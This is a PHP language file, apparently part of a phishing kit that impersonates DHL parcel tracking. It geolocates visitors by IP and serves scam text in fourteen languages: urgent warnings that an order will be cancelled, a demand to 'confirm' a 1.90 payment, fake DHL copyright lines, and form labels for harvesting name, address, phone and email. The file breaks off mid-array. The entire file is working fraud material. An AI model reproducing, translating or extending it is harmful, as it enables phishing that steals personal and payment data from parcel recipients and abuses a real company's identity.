<?php
    error_reporting(0);
    session_start();
    require_once('../libraries/geoplugin.class.php');
    
function get_client_countrycode() {
    global $countrycode;
    $details = json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=" .  $_SERVER['REMOTE_ADDR'] . ""));
    if ($details && $details->geoplugin_countryCode != null) {
        $countrycode = $details->geoplugin_countryCode;
    }
    return $countrycode;
}
 
function lang() {
    $countrycode = get_client_countrycode();
    switch ($countrycode) {
        case 'US':
            return $_SESSION['lang'] = 'en';
            break;
        case 'CA':
            return $_SESSION['lang'] = 'en';
            break;
        case 'AU':
            return $_SESSION['lang'] = 'en';
            break;
        case 'ZA':
            return $_SESSION['lang'] = 'en';
            break;
        case 'BR':
            return $_SESSION['lang'] = 'br';
            break;
        case 'PT':
            return $_SESSION['lang'] = 'br';
            break;
        case 'HK':
            return $_SESSION['lang'] = 'hk';
            break;
        case 'JP':
            return $_SESSION['lang'] = 'jp';
            break;
        case 'TW':
            return $_SESSION['lang'] = 'tw';
            break;
        case 'FR':
            return $_SESSION['lang'] = 'fr';
            break;
        case 'DE':
            return $_SESSION['lang'] = 'de';
            break;
        case 'IT':
            return $_SESSION['lang'] = 'it';
            break;
        case 'IL':
            return $_SESSION['lang'] = 'il';
            break;
        case 'IN':
            return $_SESSION['lang'] = 'in';
            break;
        case 'EE':
            return $_SESSION['lang'] = 'ee';
            break;
        case 'DK':
            return $_SESSION['lang'] = 'dk';
            break;
        case 'ES':
            return $_SESSION['lang'] = 'es';
            break;
        case 'AE':
            return $_SESSION['lang'] = 'ar';
            break;
        case 'QA':
            return $_SESSION['lang'] = 'ar';
            break;
        case 'SA':
            return $_SESSION['lang'] = 'ar';
            break;
        default:
            return $_SESSION['lang'] = 'en';
    }
}

function get_text($place) {
    global $lang;
    return $lang[$place][$_SESSION['lang']];
};

$geoplugin = new geoPlugin();
$geoplugin->locate();

$lang = array(
    'title_head' => [
        'en' => 'Information update',
        'br' => 'Atualização de informações',
        'hk' => '信息更新',
        'jp' => '情報更新',
        'tw' => '資料更新',
        'fr' => 'Mise à jour des informations',
        'de' => 'Informationsaktualisierung',
        'it' => 'Aggiornamento delle informazioni',
        'il' => 'עדכון מידע',
        'in' => 'सूचना अद्यतन',
        'ee' => 'Teabe värskendamine',
        'dk' => 'Information opdatering',
        'es' => 'Actualización de información',
        'ar' => 'تحديث المعلومات'
    ],

    'last_update' => [
        'en' => 'Last Updated',
        'br' => 'Última Atualização',
        'hk' => '最後更新',
        'jp' => '最終更新',
        'tw' => '最後更新',
        'fr' => 'Dernière mise à jour',
        'de' => 'Zuletzt aktualisiert',
        'it' => 'Ultimo aggiornamento',
        'il' => 'עדכון אחרון',
        'in' => 'अंतिम अपडेट',
        'ee' => 'Viimati uuendatud',
        'dk' => 'Sidst opdateret',
        'es' => 'Última actualización',
        'ar' => 'آخر تحديث'
    ],

    'shipment' => [
        'en' => 'Shipment type: <span class="bold-text">Other</span>',
        'br' => 'Tipo de remessa: <span class="bold-text">Outro</span>',
        'hk' => '運送類型：<span class="bold-text">其他</span>',
        'jp' => '配送タイプ：<span class="bold-text">その他</span>',
        'tw' => '運送類型：<span class="bold-text">其他</span>',
        'fr' => 'Type d\'expédition : <span class="bold-text">Autre</span>',
        'de' => 'Versandart: <span class="bold-text">Andere</span>',
        'it' => 'Tipo di spedizione: <span class="bold-text">Altro</span>',
        'il' => 'סוג המשלוח: <span class="bold-text">אחר</span>',
        'in' => 'शिपमेंट प्रकार: <span class="bold-text">अन्य</span>',
        'ee' => 'Saadetise tüüp: <span class="bold-text">Muu</span>',
        'dk' => 'Forsendelsestype: <span class="bold-text">Andet</span>',
        'es' => 'Tipo de envío: <span class="bold-text">Otro</span>',
        'ar' => 'نوع الشحن: <span class="bold-text">آخر</span>'
    ],

    'top_header1' => [
        'en' => 'Alert(1)',
        'br' => 'Alerta(1)',
        'hk' => '警告(1)',
        'jp' => '警告(1)',
        'tw' => '警告(1)',
        'fr' => 'Alerte(1)',
        'de' => 'Warnung(1)',
        'it' => 'Avviso(1)',
        'il' => 'התראה(1)',
        'in' => 'अलर्ट(1)',
        'ee' => 'Hoiatus(1)',
        'dk' => 'Advarsel(1)',
        'es' => 'Alerta(1)',
        'ar' => 'تنبيه(1)'
    ],

    'top_header2' => [
        'en' => 'Contact Us',
        'br' => 'Contate-nos',
        'hk' => '聯絡我們',
        'jp' => 'お問い合わせ',
        'tw' => '聯絡我們',
        'fr' => 'Contactez-nous',
        'de' => 'Kontaktieren Sie uns',
        'it' => 'Contattaci',
        'il' => 'יצירת קשר',
        'in' => 'संपर्क करें',
        'ee' => 'Võta meiega ühendust',
        'dk' => 'Kontakt os',
        'es' => 'Contáctenos',
        'ar' => 'اتصل بنا'
    ],

    'top_header3' => [
        'en' => 'English',
        'br' => 'Português',
        'hk' => '廣東話',
        'jp' => '日本語',
        'tw' => '中文',
        'fr' => 'Français',
        'de' => 'Deutsch',
        'it' => 'Italiano',
        'il' => 'עברית',
        'in' => 'हिंदी',
        'ee' => 'Eesti',
        'dk' => 'Dansk',
        'es' => 'Español',
        'ar' => 'العربية'
    ],

    'top_header4' => [
        'en' => 'Search',
        'br' => 'Pesquisa',
        'hk' => '搜尋',
        'jp' => '検索',
        'tw' => '搜尋',
        'fr' => 'Recherche',
        'de' => 'Suche',
        'it' => 'Ricerca',
        'il' => 'חיפוש',
        'in' => 'खोज',
        'ee' => 'Otsi',
        'dk' => 'Søg',
        'es' => 'Buscar',
        'ar' => 'بحث'
    ],

    'mainmenu1' => [
        'en' => 'Track',
        'br' => 'Rastrear',
        'hk' => '追蹤',
        'jp' => 'トラック',
        'tw' => '追蹤',
        'fr' => 'Suivi',
        'de' => 'Verfolgen',
        'it' => 'Traccia',
        'il' => 'מעקב',
        'in' => 'ट्रैक',
        'ee' => 'Jälgi',
        'dk' => 'Spor',
        'es' => 'Seguimiento',
        'ar' => 'تعقب'
    ],

    'mainmenu2' => [
        'en' => 'Shipping',
        'br' => 'Envio',
        'hk' => '運送',
        'jp' => '配送',
        'tw' => '運送',
        'fr' => 'Livraison',
        'de' => 'Versand',
        'it' => 'Spedizione',
        'il' => 'משלוח',
        'in' => 'शिपिंग',
        'ee' => 'Kohaletoimetamine',
        'dk' => 'Forsendelse',
        'es' => 'Envío',
        'ar' => 'الشحن'
    ],

    'mainmenu3' => [
        'en' => 'Logistics Solutions',
        'br' => 'Soluções Logísticas',
        'hk' => '物流解決方案',
        'jp' => '物流ソリューション',
        'tw' => '物流解決方案',
        'fr' => 'Solutions logistiques',
        'de' => 'Logistiklösungen',
        'it' => 'Soluzioni logistiche',
        'il' => 'פתרונות לוגיסטיים',
        'in' => 'लॉजिस्टिक्स समाधान',
        'ee' => 'Logistikalahendused',
        'dk' => 'Logistikløsninger',
        'es' => 'Soluciones logísticas',
        'ar' => 'حلول الخدمات اللوجستية'
    ],

    'mainmenu4' => [
        'en' => 'Customer Service',
        'br' => 'Atendimento ao Cliente',
        'hk' => '客戶服務',
        'jp' => '顧客サービス',
        'tw' => '客戶服務',
        'fr' => 'Service Client',
        'de' => 'Kundenservice',
        'it' => 'Servizio Clienti',
        'il' => 'שירות לקוחות',
        'in' => 'ग्राहक सेवा',
        'ee' => 'Klienditeenindus',
        'dk' => 'Kundeservice',
        'es' => 'Servicio al Cliente',
        'ar' => 'خدمة الزبائن'
    ],

    'header-right' => [
        'en' => 'Customer Portal Logins',
        'br' => 'Logins do Portal do Cliente',
        'hk' => '客戶入口登錄',
        'jp' => '顧客ポータルログイン',
        'tw' => '客戶入口登錄',
        'fr' => 'Connexion au portail client',
        'de' => 'Kundenportal-Anmeldungen',
        'it' => 'Accessi al portale clienti',
        'il' => 'כניסות לפורטל הלקוחות',
        'in' => 'ग्राहक पोर्टल लॉगिन',
        'ee' => 'Kliendiportaali sisselogimised',
        'dk' => 'Kundeservice portal logins',
        'es' => 'Inicios de sesión en el portal del cliente',
        'ar' => 'تسجيل دخول بوابة العملاء'
    ],

    'title-text-message-user' => [
        'en' => 'Explanatory message',
        'br' => 'Mensagem explicativa',
        'hk' => '說明訊息',
        'jp' => '説明メッセージ',
        'tw' => '說明訊息',
        'fr' => 'Message explicatif',
        'de' => 'Erklärende Nachricht',
        'it' => 'Messaggio esplicativo',
        'il' => 'הודעת הסבר',
        'in' => 'व्याख्यात्मक संदेश',
        'ee' => 'Selgitav sõnum',
        'dk' => 'Forklarende besked',
        'es' => 'Mensaje explicativo',
        'ar' => 'رسالة توضيحية'
    ],

    'text-message-user' => [
        'en' => 'Please, dear customer, do not miss this very important process and complete the required steps to ensure that your order arrives as quickly as possible, or your order will be permanently canceled.',
        'br' => 'Por favor, caro cliente, não perca este processo muito importante e conclua as etapas necessárias para garantir que seu pedido chegue o mais rápido possível, ou seu pedido será cancelado permanentemente.',
        'hk' => '親愛的客戶，請不要錯過這個非常重要的流程，並完成所需的步驟，以確保您的訂單能夠盡快送達，否則您的訂單將被永久取消。',
        'jp' => '大切なお客様へ、この非常に重要なプロセスを見逃さず、注文ができるだけ早く到着するように必要な手続きを完了してください。そうしないと、注文は永久にキャンセルされます。',
        'tw' => '親愛的客戶，請勿錯過此非常重要的流程，請完成必要的步驟，以確保您的訂單能夠盡快送達，否則您的訂單將被永久取消。',
        'fr' => 'Cher client, veuillez ne pas manquer ce processus très important et achever les étapes nécessaires pour que votre commande arrive le plus rapidement possible, sinon votre commande sera annulée définitivement.',
        'de' => 'Bitte, lieber Kunde, verpassen Sie nicht diesen sehr wichtigen Prozess und führen Sie die erforderlichen Schritte aus, damit Ihre Bestellung so schnell wie möglich ankommt, oder Ihre Bestellung wird dauerhaft storniert.',
        'it' => 'Per favore, caro cliente, non perdere questo processo molto importante e completa i passaggi necessari per garantire che il tuo ordine arrivi il più velocemente possibile, altrimenti il tuo ordine verrà annullato definitivamente.',
        'il' => 'בבקשה, לקוח יקר, אל תחמיצו את התהליך החשוב הזה והשלימו את השלבים הנדרשים כדי להבטיח שההזמנה שלכם תגיע בהקדם האפשרי, אחרת ההזמנה שלכם תבוטל באופן קבוע.',
        'in' => 'कृपया, प्रिय ग्राहक, इस बहुत महत्वपूर्ण प्रक्रिया को न चूकें और आवश्यक चरणों को पूरा करें ताकि आपका आदेश जल्द से जल्द पहुँच सके, अन्यथा आपका आदेश स्थायी रूप से रद्द कर दिया जाएगा।',
        'ee' => 'Palun, kallis klient, ärge jätke vahele seda väga olulist protsessi ja täitke vajalikud sammud, et tagada teie tellimuse võimalikult kiire kohaletoimetamine, muidu tühistatakse teie tellimus lõplikult.',
        'dk' => 'Kære kunde, gå ikke glip af denne meget vigtige proces og fuldfør de nødvendige trin for at sikre, at din ordre kommer så hurtigt som muligt, ellers vil din ordre blive permanent annulleret.',
        'es' => 'Por favor, estimado cliente, no se pierda este proceso tan importante y complete los pasos necesarios para garantizar que su pedido llegue lo más rápido posible, de lo contrario su pedido será cancelado permanentemente.',
        'ar' => 'يرجى، عزيزي العميل، عدم تفويت هذه العملية الهامة جدًا واكمال الخطوات المطلوبة لضمان وصول طلبك في اسرع وقت ممكن، وإلا سيتم إلغاء طلبك بشكل دائم.'
    ],

    'footer-menu-2' => [
        'en' => 'Legal Notice',
        'br' => 'Aviso Legal',
        'hk' => '法律聲明',
        'jp' => '法的通知',
        'tw' => '法律聲明',
        'fr' => 'Avis juridique',
        'de' => 'Rechtlicher Hinweis',
        'it' => 'Avviso legale',
        'il' => 'הודעה משפטית',
        'in' => 'कानूनी सूचना',
        'ee' => 'Õiguslik teatis',
        'dk' => 'Juridisk meddelelse',
        'es' => 'Aviso legal',
        'ar' => 'إشعار قانوني'
    ],

    'footer-menu-3' => [
        'en' => 'Terms of Use',
        'br' => 'Termos de Uso',
        'hk' => '使用條款',
        'jp' => '利用規約',
        'tw' => '使用條款',
        'fr' => 'Conditions d\'utilisation',
        'de' => 'Nutzungsbedingungen',
        'it' => 'Condizioni d\'uso',
        'il' => 'תנאי השימוש',
        'in' => 'उपयोग की शर्तें',
        'ee' => 'Kasutustingimused',
        'dk' => 'Brugsbetingelser',
        'es' => 'Condiciones de uso',
        'ar' => 'شروط الاستخدام'
    ],

    'footer-menu-4' => [
        'en' => 'Privacy Notice',
        'br' => 'Aviso de Privacidade',
        'hk' => '隱私聲明',
        'jp' => 'プライバシー通知',
        'tw' => '隱私聲明',
        'fr' => 'Avis de confidentialité',
        'de' => 'Datenschutzerklärung',
        'it' => 'Informativa sulla privacy',
        'il' => 'הודעת פרטיות',
        'in' => 'गोपनीयता सूचना',
        'ee' => 'Privaatsusteatis',
        'dk' => 'Fortrolighedserklæring',
        'es' => 'Aviso de privacidad',
        'ar' => 'إشعار الخصوصية'
    ],

    'footer-menu-5' => [
        'en' => 'Dispute Resolution',
        'br' => 'Resolução de Disputas',
        'hk' => '爭議解決',
        'jp' => '紛争解決',
        'tw' => '爭議解決',
        'fr' => 'Résolution des litiges',
        'de' => 'Konfliktlösung',
        'it' => 'Risoluzione delle controversie',
        'il' => 'פתרון סכסוך',
        'in' => 'विवाद समाधान',
        'ee' => 'Vaidluste lahendamine',
        'dk' => 'Tvistløsning',
        'es' => 'Resolución de disputas',
        'ar' => 'تسوية المنازعات'
    ],

    'footer-menu-6' => [
        'en' => 'Accessibility',
        'br' => 'Acessibilidade',
        'hk' => '無障礙',
        'jp' => 'アクセシビリティ',
        'tw' => '無障礙',
        'fr' => 'Accessibilité',
        'de' => 'Barrierefreiheit',
        'it' => 'Accessibilità',
        'il' => 'נגישות',
        'in' => 'सुलभता',
        'ee' => 'Ligipääsetavus',
        'dk' => 'Tilgængelighed',
        'es' => 'Accesibilidad',
        'ar' => 'إمكانية الوصول'
    ],

    'footer-menu-7' => [
        'en' => 'Additional Information',
        'br' => 'Informações Adicionais',
        'hk' => '其他資訊',
        'jp' => '追加情報',
        'tw' => '其他資訊',
        'fr' => 'Informations supplémentaires',
        'de' => 'Zusätzliche Informationen',
        'it' => 'Informazioni aggiuntive',
        'il' => 'מידע נוסף',
        'in' => 'अधिक जानकारी',
        'ee' => 'Lisainfo',
        'dk' => 'Yderligere information',
        'es' => 'Información adicional',
        'ar' => 'معلومات إضافية'
    ],

    'footer-menu-8' => [
        'en' => 'Cookies Settings',
        'br' => 'Configurações de Cookies',
        'hk' => 'Cookie 設置',
        'jp' => 'Cookie 設定',
        'tw' => 'Cookie 設置',
        'fr' => 'Réglages des cookies',
        'de' => 'Cookie-Einstellungen',
        'it' => 'Impostazioni dei cookie',
        'il' => 'הגדרות קובצי Cookie',
        'in' => 'कुकी सेटिंग्स',
        'ee' => 'Küpsiste seaded',
        'dk' => 'Cookie-indstillinger',
        'es' => 'Configuración de cookies',
        'ar' => 'إعدادات الكوكيز'
    ],

    'copyright' => [
        'en' => ' © DHL International GmbH. All rights reserved',
        'br' => '© DHL International GmbH. Todos os direitos reservados',
        'hk' => '© DHL International GmbH。保留所有權利',
        'jp' => '© DHL International GmbH。全著作權所有',
        'tw' => '© DHL International GmbH。保留所有權利',
        'fr' => ' © DHL International GmbH. Tous droits réservés',
        'de' => ' © DHL International GmbH. Alle Rechte vorbehalten',
        'it' => ' © DHL International GmbH. Tutti i diritti riservati',
        'il' => ' © DHL International GmbH. כל הזכויות שמורות',
        'in' => '© DHL International GmbH. सभी अधिकार सुरक्षित',
        'ee' => ' © DHL International GmbH. Kõik õigused kaitstud',
        'dk' => ' © DHL International GmbH. Alle rettigheder forbeholdes',
        'es' => ' © DHL International GmbH. Todos los derechos reservados',
        'ar' => ' © DHL International GmbH. جميع الحقوق محفوظة'
    ],

    'button-text-message-user' => [
        'en' => 'Follow the process',
        'br' => 'Siga o processo',
        'hk' => '跟隨流程',
        'jp' => 'プロセスに従う',
        'tw' => '跟隨流程',
        'fr' => 'Suivre le processus',
        'de' => 'Dem Prozess folgen',
        'it' => 'Segui il processo',
        'il' => 'עקוב אחר התהליך',
        'in' => 'प्रक्रिया का पालन करें',
        'ee' => 'Järgige protsessi',
        'dk' => 'Følg processen',
        'es' => 'Seguir el proceso',
        'ar' => 'اتبع العملية'
    ],

    'follow-us' => [
        'en' => 'Follow Us',
        'br' => 'Siga-nos',
        'hk' => '跟隨我們',
        'jp' => 'フォローする',
        'tw' => '跟隨我們',
        'fr' => 'Suivez-nous',
        'de' => 'Folgen Sie uns',
        'it' => 'Seguici',
        'il' => 'עקוב אחרינו',
        'in' => 'अनुसरण करें',  // Hindi
        'ee' => 'Jälgi meid',
        'dk' => 'Følg os',
        'es' => 'Síguenos',
        'ar' => 'تابعنا'
    ],

    'title' => [
        'en' => 'DHL TRACKING',
        'br' => 'RASTREAMENTO DHL',
        'hk' => 'DHL 追蹤',
        'jp' => 'DHL 追跡',
        'tw' => 'DHL 追蹤',
        'fr' => 'SUIVI DHL',
        'de' => 'DHL VERFOLGUNG',
        'it' => 'TRACCIAMENTO DHL',
        'il' => 'מעקב DHL',
        'in' => 'डीएचएल ट्रैकिंग',  // Hindi
        'ee' => 'DHL JÄLGIMINE',
        'dk' => 'DHL SPORING',
        'es' => 'SEGUIMIENTO DHL',
        'ar' => 'تتبع DHL'
    ],

    'title2' => [
        'en' => 'Shipment in delivering',
        'br' => 'Envio em entrega',
        'hk' => '運送中',
        'jp' => '配送中',
        'tw' => '運送中',
        'fr' => 'Expédition en cours de livraison',
        'de' => 'Sendung in Lieferung',
        'it' => 'Spedizione in consegna',
        'il' => 'משלוח במסירה',
        'in' => 'शिपमेंट डिलीवरी में है',  // Hindi
        'ee' => 'Kohaletoimetamine edastamisel',
        'dk' => 'Forsendelse i levering',
        'es' => 'Envío en entrega',
        'ar' => 'الشحنة في التسليم'
    ],

    'status' => [
        'en' => 'Status: <span class="bold-text">en entrega</span>',
        'br' => 'Status: <span class="bold-text">em entrega</span>',
        'hk' => '狀態：<span class="bold-text">正在運送</span>',
        'jp' => 'ステータス：<span class="bold-text">配送中</span>',
        'tw' => '狀態：<span class="bold-text">運送中</span>',
        'fr' => 'Statut : <span class="bold-text">en livraison</span>',
        'de' => 'Status: <span class="bold-text">in der Lieferung</span>',
        'it' => 'Stato: <span class="bold-text">in consegna</span>',
        'il' => 'סטטוס: <span class="bold-text">במסירה</span>',
        'in' => 'स्थिति: <span class="bold-text">डिलीवरी में</span>',  // Hindi
        'ee' => 'Staatus: <span class="bold-text">edastamisel</span>',
        'dk' => 'Status: <span class="bold-text">i levering</span>',
        'es' => 'Estado: <span class="bold-text">en entrega</span>',
        'ar' => 'الحالة: <span class="bold-text">في التسليم</span>'
    ],

    'total' => [
        'en' => 'Total : <span class="bold-text">1,90'.$geoplugin->currencyCode.'</span>',
        'br' => 'Total : <span class="bold-text">1,90'.$geoplugin->currencyCode.'</span>',
        'hk' => '總計：<span class="bold-text">1,90'.$geoplugin->currencyCode.'</span>',
        'jp' => '合計：<span class="bold-text">1,90'.$geoplugin->currencyCode.'</span>',
        'tw' => '總計：<span class="bold-text">1,90'.$geoplugin->currencyCode.'</span>',
        'fr' => 'Total : <span class="bold-text">1,90'.$geoplugin->currencyCode.'</span>',
        'de' => 'Gesamt : <span class="bold-text">1,90'.$geoplugin->currencyCode.'</span>',
        'it' => 'Totale : <span class="bold-text">1,90'.$geoplugin->currencyCode.'</span>',
        'il' => 'סה"כ : <span class="bold-text">1,90'.$geoplugin->currencyCode.'</span>',
        'in' => 'कुल: <span class="bold-text">1,90'.$geoplugin->currencyCode.'</span>',  // Hindi
        'ee' => 'Kokku : <span class="bold-text">1,90'.$geoplugin->currencyCode.'</span>',
        'dk' => 'Total : <span class="bold-text">1,90'.$geoplugin->currencyCode.'</span>',
        'es' => 'Total : <span class="bold-text">1,90'.$geoplugin->currencyCode.'</span>',
        'ar' => 'الإجمالي : <span class="bold-text">1,90'.$geoplugin->currencyCode.'</span>'
    ],

    'parcel' => [
        'en' => 'This shipment is handled by: <span class="bold-text"> DHL Parcel</span>',
        'br' => 'Este envio é tratado por: <span class="bold-text">DHL Parcel</span>',
        'hk' => '此運送由：<span class="bold-text">DHL 快遞</span> 處理',
        'jp' => 'この配送は：<span class="bold-text">DHL パーセル</span> によって処理されます',
        'tw' => '此運送由：<span class="bold-text">DHL 快遞</span> 處理',
        'fr' => 'Cet envoi est géré par : <span class="bold-text"> DHL Parcel</span>',
        'de' => 'Dieser Versand wird von: <span class="bold-text"> DHL Parcel</span> abgewickelt',
        'it' => 'Questa spedizione è gestita da: <span class="bold-text"> DHL Parcel</span>',
        'il' => 'משלוח זה נמצא בטיפול: <span class="bold-text"> DHL Parcel</span>',
        'in' => 'यह शिपमेंट द्वारा संभाला जाता है: <span class="bold-text"> DHL Parcel</span>',  // Hindi
        'ee' => 'See saadetis on halduses: <span class="bold-text"> DHL Parcel</span>',
        'dk' => 'Denne forsendelse håndteres af: <span class="bold-text"> DHL Parcel</span>',
        'es' => 'Este envío es gestionado por: <span class="bold-text"> DHL Parcel</span>',
        'ar' => 'تمت معالجة هذه الشحنة بواسطة: <span class="bold-text"> DHL Parcel</span>'
    ],

    'tracking' => [
        'en' => 'Tracking Code: <span class="bold-text">CS47*********</span>',
        'br' => 'Código de Rastreamento: <span class="bold-text">CS47*********</span>',
        'hk' => '追蹤代碼：<span class="bold-text">CS47*********</span>',
        'jp' => '追跡コード：<span class="bold-text">CS47*********</span>',
        'tw' => '追蹤代碼：<span class="bold-text">CS47*********</span>',
        'fr' => 'Code de suivi : <span class="bold-text">CS47*********</span>',
        'de' => 'Tracking-Code: <span class="bold-text">CS47*********</span>',
        'it' => 'Codice di tracciamento: <span class="bold-text">CS47*********</span>',
        'il' => 'קוד מעקב: <span class="bold-text">CS47*********</span>',
        'in' => 'ट्रैकिंग कोड: <span class="bold-text">CS47*********</span>',  // Hindi
        'ee' => 'Jälgimiskood: <span class="bold-text">CS47*********</span>',
        'dk' => 'Tracking kode: <span class="bold-text">CS47*********</span>',
        'es' => 'Código de seguimiento: <span class="bold-text">CS47*********</span>',
        'ar' => 'رمز التتبع: <span class="bold-text">CS47*********</span>'
    ],

    'important_title' => [
        'en' => 'Important Message!',
        'br' => 'Mensagem Importante!',
        'hk' => '重要訊息！',
        'jp' => '重要なメッセージ！',
        'tw' => '重要訊息！',
        'fr' => 'Message important !',
        'de' => 'Wichtige Nachricht!',
        'it' => 'Messaggio importante!',
        'il' => 'הודעה חשובה!',
        'in' => 'महत्वपूर्ण संदेश!',  // Hindi
        'ee' => 'Tähtis sõnum!',
        'dk' => 'Vigtig besked!',
        'es' => '¡Mensaje Importante!',
        'ar' => 'رسالة هامة!'
    ],

    'important_message' => [
        'en' => 'To complete the delivery as soon as possible, Please confirm the payment 1.90'.$geoplugin->currencyCode.' by clicking next. Online confirmation must be made within the next 14 days, before it expires.',
        'br' => 'Para completar a entrega o mais rápido possível, Por favor, confirme o pagamento 1.90'.$geoplugin->currencyCode.' clicando em próximo. A confirmação online deve ser feita dentro dos próximos 14 dias, antes que expire.',
        'hk' => '為了儘快完成交付，請點擊下一步確認付款 1.90'.$geoplugin->currencyCode.'。必須在下一個14天內進行網上確認，以免過期。',
        'jp' => '配送をできるだけ早く完了するために、次をクリックして支払い 1.90'.$geoplugin->currencyCode.'を確認してください。 オンライン確認は、14日以内に行う必要があります。',
        'tw' => '為了儘快完成交付，請點擊下一步確認付款 1.90'.$geoplugin->currencyCode.'。必須在下一個14天內進行網上確認，以免過期。',
        'fr' => 'Pour compléter la livraison dès que possible, veuillez confirmer le paiement 1.90'.$geoplugin->currencyCode.' en cliquant sur suivant. La confirmation en ligne doit être effectuée dans les 14 prochains jours, avant son expiration.',
        'de' => 'Um die Lieferung so schnell wie möglich abzuschließen, bestätigen Sie bitte die Zahlung 1.90'.$geoplugin->currencyCode.' durch Klicken auf Weiter. Die Online-Bestätigung muss innerhalb der nächsten 14 Tage erfolgen, bevor sie abläuft.',
        'it' => 'Per completare la consegna il prima possibile, conferma il pagamento 1.90'.$geoplugin->currencyCode.' cliccando su Avanti. La conferma online deve essere fatta entro i prossimi 14 giorni, prima che scada.',
        'il' => 'כדי להשלים את המשלוח בהקדם האפשרי, אנא אשר את התשלום 1.90'.$geoplugin->currencyCode.' על ידי לחיצה על הבא. אישור מקוון חייב להתבצע בתוך 14 הימים הקרובים, לפני שיתבטל.',
        'in' => 'डिलीवरी को जल्द से जल्द पूरा करने के लिए, कृपया अगला क्लिक करके 1.90'.$geoplugin->currencyCode.' का भुगतान पुष्टि करें। ऑनलाइन पुष्टि अगले 14 दिनों के भीतर की जानी चाहिए, इससे पहले कि यह समाप्त हो जाए।',  // Hindi
        'ee' => 'Et täita tarnimine võimalikult kiiresti, kinnitage makse (1,90) järgmise klõpsamisega. Veebikinnitust tuleb teha järgmise 14 päeva jooksul, enne kui see aegub.',
        'dk' => 'For at fuldføre leveringen så hurtigt som muligt, bekræft venligst betalingen (1,90) ved at klikke på næste. Online bekræftelse skal foretages inden for de næste 14 dage, før det udløber.',
        'es' => 'Para completar la entrega lo antes posible, confirme el pago 1.90'.$geoplugin->currencyCode.' haciendo clic en Siguiente. La confirmación en línea debe realizarse en los próximos 14 días, antes de que expire.',
        'ar' => 'لإتمام التسليم في أقرب وقت ممكن، يرجى تأكيد الدفع 1.90'.$geoplugin->currencyCode.' بالنقر فوق التالي. يجب إجراء التأكيد عبر الإنترنت خلال الأيام ال١٤ القادمة، قبل انتهائه.'
    ],

    'next' => [
        'en' => 'Next',
        'br' => 'Próximo',
        'hk' => '下一步',
        'jp' => '次へ',
        'tw' => '下一步',
        'fr' => 'Suivant',
        'de' => 'Weiter',
        'it' => 'Avanti',
        'il' => 'הבא',
        'in' => 'अगला',  // Hindi
        'ee' => 'Järgmine',
        'dk' => 'Næste',
        'es' => 'Siguiente',
        'ar' => 'التالي'
    ],

    'title_form_1'=> [
        'en' => 'Contact Information',
        'br' => 'Informações de contato',
        'hk' => '聯絡資訊',
        'jp' => '連絡先情報',
        'tw' => '聯絡資訊',
        'fr' => 'Informations de contact',
        'de' => 'Kontaktinformation',
        'it' => 'Informazioni di contatto',
        'il' => 'פרטי קשר',
        'in' => 'संपर्क जानकारी',  
        'ee' => 'Kontaktandmed',
        'dk' => 'Kontaktinformation',
        'es' => 'Información de contacto',
        'ar' => 'معلومات الاتصال'
    ],

    'full_name_label' => [
        'en' => 'Full name',
        'br' => 'Nome completo',
        'hk' => '全名',
        'jp' => 'フルネーム',
        'tw' => '全名',
        'fr' => 'Nom complet',
        'de' => 'Vollständiger Name',
        'it' => 'Nome completo',
        'il' => 'שם מלא',
        'in' => 'पूरा नाम',  
        'ee' => 'Täisnimi',
        'dk' => 'Fulde navn',
        'es' => 'Nombre completo',
        'ar' => 'الاسم الكامل'
    ],

    'address_label' => [
        'en' => 'Address',
        'br' => 'Endereço',
        'hk' => '地址',
        'jp' => '住所',
        'tw' => '地址',
        'fr' => 'Adresse',
        'de' => 'Adresse',
        'it' => 'Indirizzo',
        'il' => 'כתובת',
        'in' => 'पता',  
        'ee' => 'Aadress',
        'dk' => 'Adresse',
        'es' => 'Dirección',
        'ar' => 'العنوان'
    ],

    'country_label' => [
        'en' => 'Country',
        'br' => 'País',
        'hk' => '國家',
        'jp' => '国',
        'tw' => '國家',
        'fr' => 'Pays',
        'de' => 'Land',
        'it' => 'Paese',
        'il' => 'מדינה',
        'in' => 'देश',  
        'ee' => 'Riik',
        'dk' => 'Land',
        'es' => 'País',
        'ar' => 'البلد'
    ],

    'city_label' => [
        'en' => 'City',
        'br' => 'Cidade',
        'hk' => '城市',
        'jp' => '市区町村',
        'tw' => '城市',
        'fr' => 'Ville',
        'de' => 'Stadt',
        'it' => 'Città',
        'il' => 'עיר',
        'in' => 'शहर',  
        'ee' => 'Linn',
        'dk' => 'By',
        'es' => 'Ciudad',
        'ar' => 'المدينة'
    ],

    'State_label' => [
        'en' => 'State',
        'br' => 'Estado',
        'hk' => '州',
        'jp' => '都道府県',
        'tw' => '州',
        'fr' => 'État',
        'de' => 'Bundesland',
        'it' => 'Stato',
        'il' => 'מדינה',
        'in' => 'राज्य',  
        'ee' => 'Maakond',
        'dk' => 'Stat',
        'es' => 'Estado',
        'ar' => 'الولاية'
    ],

    'phone_label' => [
        'en' => 'Phone number',
        'br' => 'Número de telefone',
        'hk' => '電話號碼',
        'jp' => '電話番号',
        'tw' => '電話號碼',
        'fr' => 'Numéro de téléphone',
        'de' => 'Telefonnummer',
        'it' => 'Numero di telefono',
        'il' => 'מספר טלפון',
        'in' => 'फ़ोन नंबर',  
        'ee' => 'Telefoninumber',
        'dk' => 'Telefonnummer',
        'es' => 'Número de teléfono',
        'ar' => 'رقم الهاتف'
    ],

    'email_label' => [
        'en' => 'Email',
        'br' => 'E-mail',
        'hk' => '電子郵件',
        'jp' => 'メールアドレス',
        'tw' => '電子郵件',
        'fr' => 'Email',
        'de' => 'E-Mail',
        'it' => 'Email',
        'il' => 'דוא"ל',
        'in' => 'ईमेल',  
        'ee' => 'E-post',
        'dk' => 'E-mail',
        'es' => 'Correo electrónico',
        'ar' => 'البريد الإلكتروني'
    ],

    'zip_code_label' => [
        'en' => 'Zip code',
        'br' => 'Código postal',
        'hk' => '郵政編碼',
        'jp' => '郵便番号',
        'tw' => '郵遞區號',
        'fr' => 'Code postal',
        'de' => 'Postleitzahl',
        'it' => 'Codice postale',
        'il' => 'מיקוד',
        'in' => 'पिन कोड',  
        'ee' => 'Postiindeks',
        'dk' => 'Postnummer',
        'es' => 'Código postal',
        'ar' => 'الرمز البريدي'
    ],

    'message_error_inputs'=> [
        'en' => 'This field is required!',
        'br' => 'Este campo é obrigatório!',
        'hk' => '此字段為必填項！',
        'jp' => 'このフィールドは必須です！',
        'tw' => '此欄位為必填項！',
        'fr' => 'Ce champ est requis !',
        'de' => 'Dieses Feld ist erforderlich!',
        'it' => 'Questo campo è obbligatorio!',
        'il' => 'שדה זה הוא חובה!',
